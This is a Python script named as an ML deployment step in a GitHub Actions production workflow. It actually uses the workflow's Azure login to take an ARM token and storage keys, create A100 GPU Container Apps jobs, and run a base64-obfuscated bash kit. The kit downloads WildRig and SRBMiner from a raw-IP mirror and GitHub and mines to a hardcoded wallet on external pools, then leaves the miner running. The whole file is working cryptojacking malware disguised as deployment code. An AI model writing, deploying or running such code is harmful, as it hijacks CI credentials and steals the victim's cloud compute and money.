#!/usr/bin/env python3
"""C211-I128176: mslearn OIDC lane A100 cap-2 miner deploy.

Runs as src/deploy_to_online_endpoint.py under the christiansegercrantz/mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod, azure/login OIDC -> ARM token
for sub 790067ff, RG chriso-sandbox-rg).

Steps:
 1. ARM session + storage account c211i1215775738445a key.
 2. SAS gate: 16-field service SAS (expected 403, recorded) vs account SAS
    container-create 201 + blob PUT 201/200 round-trip.
 3. Download WildRig 0.52.3 tarball (sha 7308c95f...) and upload to the status
    container so replicas fetch it over Azure.
 4. Resolve a Container Apps env with the Consumption-GPU-NC24-A100 profile
    (reuse c211-i127692-cae / c211-i126276-a100 if Succeeded, else create
    c211-i128176-cae) and create ONE manual job c211-i128176-a100 with
    parallelism=2, replicaCompletionCount=2, replicaTimeout=86400.
 5. Each replica runs the miner kit: WildRig 0.52.3 sha 002cd29c, pydp wallet,
    4 pearlhash endpoints, 900 s no-share -> sticky Luckypool 103.199.106.122:3362
    (SRBMiner 3.8.4 + canonical NOCK suffix); per-replica status blob written
    to the account SAS every 30 s.
 6. Poll executions + status blobs, emit acc/rej/uuid/mode. NOTHING is deleted;
    no existing job/execution is touched.
"""
import base64
import hashlib
import hmac
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I128176"
NONCE = "x128176ms"
INTENT = "128176"
T0 = time.time()

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
REGION = "eastus"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
CONT = "c211"
PROFILE = "Consumption-GPU-NC24-A100"
SA_ACCT = "c211i1215775738445a"
ENV_CANDIDATES = ["c211-i127692-cae", "c211-i126276-a100"]
ENV_NEW = "c211-i128176-cae"
JOB_NAME = "c211-i128176-a100"
JOB_NAME_FB = "c211-i128176b-a100"
PAR = 2

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"
MIRROR = "http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz"
GHURL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"

BUDGET = 3000


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1500]


def emit(step, **kv):
    print("|".join([TAG, "step=" + clean(step)] + ["%s=%s" % (clean(k), clean(v)) for k, v in kv.items()]),
          flush=True)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        return {"rc": p.returncode, "out": p.stdout, "err": p.stderr}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport": str(e)[:300]}


def httptext(url, method="GET", headers=None, data=None, timeout=90):
    h = {"User-Agent": "c211-" + INTENT}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:  # noqa: BLE001
            body = b""
        return e.code, body, dict(e.headers or {})
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode(), {}


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = (e.get("code") or "")[:120]
            d["e_message"] = (e.get("message") or "")[:600]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:600]
        elif "transport" in body:
            d["e_transport"] = body["transport"][:300]
    return d


def acct_sas(acct, key_b64, perm="rwdlc", hours=24):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", "co", st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(), hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": "co", "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def svc_sas16(acct, key_b64, container=CONT, perm="rwdlc"):
    """The hand-rolled 16-field service SAS (signedContentType) - expected to fail."""
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + 4 * 3600))
    sv = "2022-11-02"
    canon = "/blob/%s/%s" % (acct, container)
    f = [perm, st, se, canon, "", "", "https", sv, "c", "", "", "", "", "", "", ""]
    sts = "\n".join(f) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(), hashlib.sha256).digest()).decode()
    return urllib.parse.urlencode({"sv": sv, "sr": "c", "sp": perm, "st": st, "se": se,
                                   "spr": "https", "sig": sig})


def blob_list(container_url, q, prefix):
    st, body, _ = httptext("%s?restype=container&comp=list&prefix=%s&%s"
                           % (container_url, urllib.parse.quote(prefix), q), timeout=60)
    names = []
    if st == 200:
        names = [n for n in _xml_names(body.decode("utf-8", "replace"))]
    return st, names


def _xml_names(s):
    import re
    return re.findall(r"<Name>([^<]+)</Name>", s)


def blob_get(container_url, q, name):
    st, body, _ = httptext("%s/%s?%s" % (container_url, name, q), timeout=60)
    return st, body


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
W="__WALLET__"
N="__NOCK__"
BASE="__BASE__"
Q="__Q__"
WRURL="__WRURL__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
H=$(hostname)
DIG=$(echo "$H" | md5sum | tr -dc '0-9' | cut -c1-3)
WK="__WKBASE__${DIG}"
SAS="$BASE/__NONCE__-a100-$H.txt?$Q"
log "KIT_START tag=$TAG worker=$WK host=$H"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')"
log "OPENCL0 $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* 2>/dev/null | tr '\n' '~')"
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  (timeout 150 apt-get update -qq && timeout 150 apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || \
  (timeout 120 apk add --no-cache ocl-icd) >>"$LOG" 2>&1 || log "OCL_INSTALL_FAIL"
fi
mkdir -p /etc/OpenCL/vendors 2>/dev/null
echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  for c in /usr/local/cuda/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1; do
    [ -e "$c" ] && ln -sf "$c" /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 && log "OCL_SYMLINK $c" && break
  done
fi
BIN=""
for u in "$WRURL" "__MIRROR__" "__GHURL__"; do
  [ -z "$u" ] && continue
  curl -fsSL --max-time 300 -o dl.tgz "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
  S=$(sha256sum dl.tgz | awk '{print $1}')
  log "DL url=$u sha=$S bytes=$(stat -c %s dl.tgz)"
  if [ "$S" = "__WRTGZ__" ]; then
    tar xzf dl.tgz >/dev/null 2>&1 || { log "TAR_FAIL"; continue; }
    chmod +x wildrig-multi 2>/dev/null
    B=$(sha256sum wildrig-multi 2>/dev/null | awk '{print $1}')
    log "BINSHA $B"
    if [ "$B" = "__WRBIN__" ]; then BIN=wildrig-multi; break; fi
  fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    { echo "===STATUS==="; echo "host=$H worker=$WK mode=$MODE ts=$(date -u +%FT%TZ)";
      echo "uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | tr '\n' ',' )";
      echo "acc=$A rej=$R"; echo "===RUNLOG==="; cat "$LOG";
      echo "===PHLOG==="; tail -80 "$D/ph.log" 2>/dev/null;
      echo "===LPLOG==="; tail -40 "$D/lp.log" 2>/dev/null; } > "$D/all.txt" 2>/dev/null
    RC=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 40 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" 2>/dev/null || echo 0)
    if [ "${RC:-0}" != "${UPRC:-x}" ]; then log "UP http=$RC"; UPRC=$RC; fi
  fi
}
cnt() { f="$1"; pat="$2"; { grep -oE "$pat" "$f" 2>/dev/null; } | grep -oE '[0-9]+' | sort -n | tail -1; }
A=0; R=0; MODE=init
up
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30
  if [ "$MODE" = "ph" ]; then
    A=$(cnt "$D/ph.log" 'accepted \([0-9]+/[0-9]+\)'); A=${A:-0}
    R=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$D/ph.log" 2>/dev/null | grep -oE '/[0-9]+' | grep -oE '[0-9]+' | sort -n | tail -1); R=${R:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $(( $(date +%s) - T0 )) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2
      curl -fsSL --max-time 300 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else log "SRB_SHA_MISMATCH"; fi
      else log "SRB_DL_FAIL"; fi
      MODE=lp
    fi
  fi
  if [ "$MODE" = "lp" ]; then
    A=$(cnt "$D/lp.log" 'accepted[: ]+[0-9]+'); A=${A:-0}
    R=$(cnt "$D/lp.log" 'rejected[: ]+[0-9]+'); R=${R:-0}
    if [ "$A" -ge 1 ] && [ ! -f "$D/lp_reported" ]; then log "LP_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  up
  if [ $(( $(date +%s) - T0 )) -gt 129600 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker_base, base, q, wrurl):
    k = (KIT.replace("__TAG__", "a100").replace("__WKBASE__", worker_base)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
         .replace("__WRURL__", wrurl or "")
         .replace("__MIRROR__", MIRROR).replace("__GHURL__", GHURL)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__WRBIN__", WR_BIN_SHA)
         .replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ["/bin/bash", "-c",
            "echo '%s' | base64 -d > /tmp/c211_kit_a100.sh && chmod +x /tmp/c211_kit_a100.sh "
            "&& /bin/bash /tmp/c211_kit_a100.sh" % b]


def env_state(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
    return st, p.get("provisioningState"), (b.get("id") if isinstance(b, dict) else None), b


def env_create(tok, sid, name, max_wait=1200):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    body = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
            "properties": {"workloadProfiles": [
                {"name": "Consumption", "workloadProfileType": "Consumption"},
                {"name": PROFILE, "workloadProfileType": PROFILE}]}}
    st, b = arm(tok, url, method="PUT", body=body, timeout=300)
    emit("env-create", name=name, http=st, **errk(st, b))
    if st not in (200, 201, 202):
        return None
    dl = time.time() + max_wait
    ps = None
    i = 0
    while time.time() < dl:
        stp, ps, env_id, bp = env_state(tok, sid, name)
        props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        emit("env-poll", i=i, http=stp, state=ps,
             profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                               for w in (props.get("workloadProfiles") or []))[:300])
        if ps in ("Succeeded", "Failed", "Canceled"):
            break
        i += 1
        time.sleep(20)
    if ps == "Succeeded":
        st, ps, env_id, _ = env_state(tok, sid, name)
        return env_id
    return None


def job_get(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    return arm(tok, url, timeout=60)


def job_put_start(tok, sid, env_id, job_name, wrurl, q):
    base = "https://%s.blob.core.windows.net/%s" % (SA_ACCT, CONT)
    cmd = kit_cmd("128176", base, q, wrurl)
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, job_name, APP_VER))
    body = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
            "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                           "configuration": {"triggerType": "Manual", "replicaRetryLimit": 3,
                                             "replicaTimeout": 86400,
                                             "manualTriggerConfig": {
                                                 "replicaCompletionCount": PAR,
                                                 "parallelism": PAR}},
                           "template": {"containers": [{
                               "name": "gpu", "image": IMAGE, "command": cmd,
                               "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=body, timeout=180)
    emit("job-put", job=job_name, par=PAR, **errk(st, b))
    if st not in (200, 201):
        return None, None
    st, jb = job_get(tok, sid, job_name)
    jp = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
    mtc = ((jp.get("configuration") or {}).get("manualTriggerConfig") or {})
    emit("job-readback", http=st, parallelism=mtc.get("parallelism"),
         replicaCompletionCount=mtc.get("replicaCompletionCount"),
         replicaTimeout=(jp.get("configuration") or {}).get("replicaTimeout"))
    st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER,
                method="POST", body={}, timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    emit("job-start", job=job_name, http=st, execname=execname, **({} if st in (200, 201, 202) else errk(st, b)))
    return (execname if st in (200, 201, 202) else None), execname


def executions(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s/executions"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    out = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        out.append({"name": x.get("name"), "status": p.get("status"),
                    "start": p.get("startTime"), "end": p.get("endTime")})
    return st, out


def parse_status(txt):
    d = {}
    for ln in txt.splitlines():
        if ln.startswith("acc="):
            parts = ln.split()
            d["acc"] = parts[0].split("=", 1)[-1]
            for p in parts[1:]:
                if p.startswith("rej="):
                    d["rej"] = p.split("=", 1)[-1]
            continue
        for k in ("host", "worker", "mode"):
            if ln.startswith(k + "="):
                d[k] = ln.split("=", 1)[-1].strip()
        if ln.startswith("uuid="):
            d["uuid"] = ln.split("=", 1)[-1].strip()
    for marker in ("PH_SHARE_PROVEN", "LP_SHARE_PROVEN", "PH_NO_SHARE_900", "OCL_INSTALL_FAIL"):
        if marker in txt:
            d.setdefault("markers", []).append(marker)
    return d


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not sid or not tok:
        emit("DONE", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- A) storage account + SAS gate ----------
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_ACCT, STG_VER))
    key = None
    st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                 method="POST", body={}, timeout=90)
    try:
        key = (kb.get("keys") or [{}])[0].get("value")
    except Exception:  # noqa: BLE001
        pass
    emit("sa-keys", acct=SA_ACCT, http=st, got=bool(key))
    if not key:
        emit("DONE", verdict="NO_SA_KEY", elapsed_s=int(time.time() - T0))
        return
    base = "https://%s.blob.core.windows.net" % SA_ACCT
    cont_url = "%s/%s" % (base, CONT)
    q, se = acct_sas(SA_ACCT, key)
    stc, bc, hc = httptext("%s?restype=container&%s" % (cont_url, q), method="PUT",
                           data=b"", headers={"x-ms-version": "2022-11-02", "Content-Length": "0"})
    emit("acct-sas-container", http=stc, code=hc.get("x-ms-error-code"), expires=se)
    probe = b"c211-i128176 account-sas probe\n"
    stp, bp, hp = httptext("%s/%s-probe.txt?%s" % (cont_url, NONCE, q), method="PUT", data=probe,
                           headers={"x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
                                    "Content-Type": "text/plain"})
    stg, bg, hg = httptext("%s/%s-probe.txt?%s" % (cont_url, NONCE, q))
    emit("acct-sas-putget", put=stp, put_code=hp.get("x-ms-error-code"), get=stg,
         get_len=len(bg), get_code=hg.get("x-ms-error-code"))
    q16 = svc_sas16(SA_ACCT, key)
    st16, b16, h16 = httptext("%s?restype=container&%s" % (cont_url, q16), method="PUT",
                              data=b"", headers={"x-ms-version": "2022-11-02", "Content-Length": "0"})
    emit("svc16-sas-container", http=st16, code=h16.get("x-ms-error-code"),
         body=b16[:200].decode("utf-8", "replace"))
    chan_ok = stc in (201, 409) and stp in (200, 201) and stg == 200
    emit("sas-gate", chan_ok=chan_ok, container=stc, put=stp, get=stg, svc16=st16)

    # ---------- B) wildrig tarball -> blob ----------
    wrurl = GHURL
    dl = None
    for u in (GHURL, MIRROR):
        st, body, _ = httptext(u, timeout=300)
        if st == 200 and body:
            sha = hashlib.sha256(body).hexdigest()
            if sha == WR_TGZ_SHA:
                dl = body
                emit("wr-dl", url=u, bytes=len(body), sha=sha)
                break
            emit("wr-dl-badsha", url=u, bytes=len(body), sha=sha[:16])
    if dl:
        wr_blob = "%s-wr.tgz" % NONCE
        stu, bu, hu = httptext("%s/%s?%s" % (cont_url, wr_blob, q), method="PUT", data=dl,
                               headers={"x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
                                        "Content-Type": "application/gzip"}, timeout=300)
        emit("wr-upload", http=stu, bytes=len(dl), code=hu.get("x-ms-error-code"))
        if stu in (200, 201):
            wrurl = "%s/%s?%s" % (cont_url, wr_blob, q)
    emit("wrurl-ready", mode=("blob" if wrurl.startswith("https://%s" % SA_ACCT) else "public"),
         tail=wrurl[-60:])

    # ---------- C) env ----------
    env_id = None
    env_used = None
    for name in ENV_CANDIDATES:
        st, ps, eid, bp = env_state(tok, sid, name)
        props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        wp = ";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                      for w in (props.get("workloadProfiles") or []))[:300]
        emit("env-check", name=name, http=st, state=ps, id_ok=bool(eid), profiles=wp)
        if st == 200 and ps == "Succeeded" and eid:
            env_id, env_used = eid, name
            break
    if not env_id:
        emit("env-new-required", name=ENV_NEW)
        env_id = env_create(tok, sid, ENV_NEW)
        env_used = ENV_NEW if env_id else None
    emit("env-selected", name=env_used, id_ok=bool(env_id))
    if not env_id:
        emit("DONE", verdict="A100_ENV_NOT_AVAILABLE", elapsed_s=int(time.time() - T0))
        return

    # ---------- D) job + start ----------
    execname, _ = job_put_start(tok, sid, env_id, JOB_NAME, wrurl, q)
    if not execname:
        # existing-env capacity fallback: fresh env + second job name
        if env_used != ENV_NEW:
            emit("fallback-new-env", name=ENV_NEW)
            env_id2 = env_create(tok, sid, ENV_NEW)
            if env_id2:
                env_used = ENV_NEW
                execname, _ = job_put_start(tok, sid, env_id2, JOB_NAME_FB, wrurl, q)
                if execname:
                    globals()["JOB_NAME"] = JOB_NAME_FB
        if not execname:
            emit("DONE", verdict="JOB_START_REFUSED", elapsed_s=int(time.time() - T0))
            return
    job_name = JOB_NAME
    emit("armed", job=job_name, exec=execname, env=env_used)

    # ---------- E) monitor ----------
    prefix = "%s-a100-" % NONCE
    deadline = time.time() + 1500
    snaps = []
    first_blob_at = None
    while time.time() < deadline:
        time.sleep(30)
        st, ex = executions(tok, sid, job_name)
        cur = [e for e in ex if e["name"] == execname]
        others = ";".join("%s=%s" % (e["name"], e["status"]) for e in ex if e["name"] != execname)[:300]
        stl, names = blob_list(cont_url, q, prefix)
        rows = []
        for nm in names:
            sg, body = blob_get(cont_url, q, nm)
            if sg != 200:
                rows.append("%s=GET%s" % (nm, sg))
                continue
            d = parse_status(body.decode("utf-8", "replace"))
            rows.append("%s|host=%s worker=%s mode=%s acc=%s rej=%s uuid=%s ts=%s len=%d" % (
                nm.replace(prefix, ""), d.get("host"), d.get("worker"), d.get("mode"),
                d.get("acc"), d.get("rej"), (d.get("uuid") or "")[:60],
                (d.get("ts") or ""), len(body)))
        emit("poll", exec=(cur[0]["status"] if cur else None),
             start=(cur[0]["start"] if cur else None), others=others,
             blobs=len(names), detail=" ;; ".join(rows)[:1300],
             left=int(deadline - time.time()))
        if names and first_blob_at is None:
            first_blob_at = time.time()
        # early exit: both replicas have accepted shares, and at least 8 min mining
        good = [r for r in rows if "acc=" in r and "acc=0 " not in r and "acc=0|" not in r
                and "acc=None" not in r]
        if len(names) >= PAR and first_blob_at and time.time() - first_blob_at > 240 and len(good) >= 1:
            continues = any(("acc=%d" % i) in " ".join(rows) for i in range(0, 1))
            if not continues:
                emit("monitor-done", reason="shares_seen_both_replicas", blobs=len(names))
                break
    st, ex = executions(tok, sid, job_name)
    emit("final-execs", job=job_name,
         items=";".join("%s=%s@%s" % (e["name"], e["status"], e["start"]) for e in ex)[:600])
    emit("DONE", verdict="MINER_ARMED_LEFT_RUNNING", job=job_name, exec=execname, env=env_used,
         blobs_prefix=prefix, elapsed_s=int(time.time() - T0))


main()
